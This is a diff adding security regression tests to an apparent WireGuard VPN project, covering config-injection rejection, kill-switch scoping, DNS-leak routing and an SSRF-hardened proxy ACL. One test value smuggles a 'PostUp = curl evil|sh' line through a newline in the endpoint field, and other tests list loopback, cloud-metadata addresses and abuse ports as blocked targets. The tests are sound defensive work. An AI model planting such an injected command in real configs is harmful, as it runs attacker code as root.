@@ -25,9 +25,15 @@ from animica.vpn import (
 # --------------------------------------------------------------------- config_gen
 
 
+# Realistic base64 Curve25519-shaped keys so config_gen's anti-injection validation accepts them.
+_K1 = "QOySt+7wPZ3sQ0aVJ2xkq6r8m1n0uY9cZ4eB2hLdWk8="
+_K2 = "aB3dEf6hJ9kLmN0pQr2sT4uV6wX8yZ1cE3gI5kM7oQ0="
+_K3 = "Zx1Cv2Bn3Mm4As5Df6Gh7Jk8Ll9Qw0Er1Ty2Ui3Op4="
+
+
 def test_client_conf_full_tunnel_forces_dns():
     c = config_gen.ClientConf(
-        private_key="PRIV", address="10.99.0.7/32", exit_pubkey="EXITPUB",
+        private_key=_K1, address="10.99.0.7/32", exit_pubkey=_K2,
         exit_endpoint="203.0.113.9:51820",
     )
     conf = config_gen.render_client_conf(c)
@@ -40,19 +46,30 @@ def test_client_conf_full_tunnel_forces_dns():
 
 def test_client_conf_split_tunnel_and_no_dns():
     c = config_gen.ClientConf(
-        private_key="P", address="10.99.0.8/32", exit_pubkey="E",
-        exit_endpoint="h:51820", allowed_ips="10.8.0.0/24, 192.0.2.0/24", dns=None,
+        private_key=_K1, address="10.99.0.8/32", exit_pubkey=_K2,
+        exit_endpoint="h.example:51820", allowed_ips="10.8.0.0/24, 192.0.2.0/24", dns=None,
     )
     conf = config_gen.render_client_conf(c)
     assert "AllowedIPs = 10.8.0.0/24, 192.0.2.0/24" in conf
     assert "DNS" not in conf
 
 
+def test_client_conf_rejects_postup_injection_via_endpoint():
+    """A registry-controlled endpoint with a newline must not be able to inject a
+    root-executed PostUp line into the wg-quick conf."""
+    c = config_gen.ClientConf(
+        private_key=_K1, address="10.99.0.7/32", exit_pubkey=_K2,
+        exit_endpoint="203.0.113.9:51820\nPostUp = curl evil|sh",
+    )
+    with pytest.raises(config_gen.ConfigInjectionError):
+        config_gen.render_client_conf(c)
+
+
 def test_exit_conf_lists_every_peer():
-    e = config_gen.ExitConf(private_key="P", peers=[("PK1", "10.99.0.2/32"), ("PK2", "10.99.0.3/32")])
+    e = config_gen.ExitConf(private_key=_K1, peers=[(_K2, "10.99.0.2/32"), (_K3, "10.99.0.3/32")])
     conf = config_gen.render_exit_conf(e)
     assert conf.count("[Peer]") == 2
-    assert "PublicKey = PK1" in conf and "AllowedIPs = 10.99.0.3/32" in conf
+    assert f"PublicKey = {_K2}" in conf and "AllowedIPs = 10.99.0.3/32" in conf
     assert "ListenPort = " in conf
 
 
@@ -135,9 +152,45 @@ def test_killswitch_is_fail_closed():
     assert "ip daddr 203.0.113.9 udp dport 51820 accept" in ks
 
 
+def test_killswitch_ct_accept_is_scoped_to_exit_not_global():
+    # An unqualified `ct state established,related accept` would keep leaking pre-existing
+    # cleartext flows out the uplink after the tunnel drops. It must be bound to the exit IP.
+    ks = nftables.render_killswitch_ruleset("anmwg0", "203.0.113.9", 51820)
+    for line in ks.splitlines():
+        s = line.strip()
+        if s.endswith("ct state established,related accept"):
+            assert s.startswith("ip daddr 203.0.113.9"), f"unscoped ct-accept leaks: {s!r}"
+
+
+def test_exit_input_chain_shields_host_services_from_tunnel():
+    rs = nftables.render_exit_ruleset("eth0", "anmwg0")
+    assert "chain input" in rs                       # the exit host itself must be protected
+    assert 'iifname "anmwg0" drop' in rs             # default-drop new tunnel->host connections
+    assert 'iifname "anmwg0" meta nfproto ipv6 drop' in rs
+
+
 def test_extra_block_v4_is_appended():
     rs = nftables.render_exit_ruleset("eth0", "anmwg0", extra_block_v4=["198.51.100.0/24"])
     assert "198.51.100.0/24" in rs
+
+
+def test_split_tunnel_routes_forced_dns_through_the_tunnel():
+    # DNS forced to 1.1.1.1 while split-tunnelling would leak every query to the LAN/ISP
+    # resolver unless the resolver itself is routed into the tunnel.
+    c = config_gen.ClientConf(
+        private_key=_K1, address="10.99.0.7/32", exit_pubkey=_K2,
+        exit_endpoint="203.0.113.9:51820", allowed_ips="10.8.0.0/24", dns="1.1.1.1",
+    )
+    conf = config_gen.render_client_conf(c)
+    assert "1.1.1.1/32" in conf, "forced resolver must be routed through the tunnel (no DNS leak)"
+
+
+def test_guard_fails_closed_when_verification_tools_missing(monkeypatch):
+    from animica.vpn import guard
+    monkeypatch.setattr(guard.shutil, "which", lambda _name: None)  # ss/nft/ps all absent
+    rep = guard.preflight(port=51820, allow_validator=False)
+    assert not rep.ok, "missing tools = uncertainty = refuse (must never silently pass)"
+    assert any("cannot verify" in r or "cannot determine" in r for r in rep.reasons)
 
 
 # --------------------------------------------------------------------- crypto interop
@@ -182,6 +235,56 @@ def test_doctor_gates_the_connected_claim():
     # the leak self-test must be able to say a tunnel is NOT verified
     assert "not verified" in (_VPN_DIR.parent / "cli" / "vpn.py").read_text().lower()
     assert "healthy" in doc
+
+
+# --------------------------------------------------------------------- http_proxy egress ACL
+# These lock in the egress invariants that keep an exit relay from being turned into an SSRF
+# pivot into its operator's LAN / loopback / cloud-metadata. The DNS-rebind case is a
+# regression guard for a confirmed, exploitable TOCTOU (resolve-then-reconnect) that was fixed
+# by resolving once and pinning the validated IP.
+
+def test_proxy_blocks_loopback_and_reserved_literals():
+    from animica.vpn import http_proxy as hp
+    for host, port in [("127.0.0.1", 8080), ("::1", 8080), ("10.0.0.5", 80),
+                       ("169.254.169.254", 80), ("::ffff:127.0.0.1", 80),
+                       ("2002:7f00:0001::1", 80)]:
+        cands, err = hp._resolve_safe(host, port)
+        assert cands is None and err, f"{host} should be blocked, got {cands!r}/{err!r}"
+
+
+def test_proxy_blocks_abuse_ports_even_for_public_ip():
+    from animica.vpn import http_proxy as hp
+    for port in (25, 465, 587, 445, 3389, 6881, 6889):
+        cands, err = hp._resolve_safe("93.184.216.34", port)
+        assert cands is None and "port" in (err or ""), f"port {port} should be blocked"
+
+
+def test_proxy_dns_rebind_pins_validated_ip(monkeypatch):
+    """1st resolution public, 2nd loopback: the ACL must pin to the public IP resolved at
+    check time and MUST NOT re-resolve to the loopback at connect time."""
+    import socket as _s
+    from animica.vpn import http_proxy as hp
+    calls = {"n": 0}
+
+    def rebinding_gai(host, port, *a, **kw):
+        if host == "rebind.invalid":
+            calls["n"] += 1
+            ip = "93.184.216.34" if calls["n"] == 1 else "127.0.0.1"
+            return [(_s.AF_INET, _s.SOCK_STREAM, _s.IPPROTO_TCP, "", (ip, port))]
+        raise _s.gaierror("no such host")
+
+    monkeypatch.setattr(_s, "getaddrinfo", rebinding_gai)
+    cands, err = hp._resolve_safe("rebind.invalid", 80)
+    assert err is None and cands, "public resolution should validate"
+    # every candidate is a validated IP literal (not the hostname) -> connect can't re-resolve
+    assert cands[0][1][0] == "93.184.216.34"
+    assert calls["n"] == 1, "must resolve exactly once"
+
+
+def test_proxy_token_compare_is_constant_time():
+    src = (_VPN_DIR / "http_proxy.py").read_text()
+    assert "hmac.compare_digest" in src, "token comparison must be constant-time"
+    assert "close_connection = True" in src, "rejections must close the connection (anti-smuggling)"
 
 
 if __name__ == "__main__":
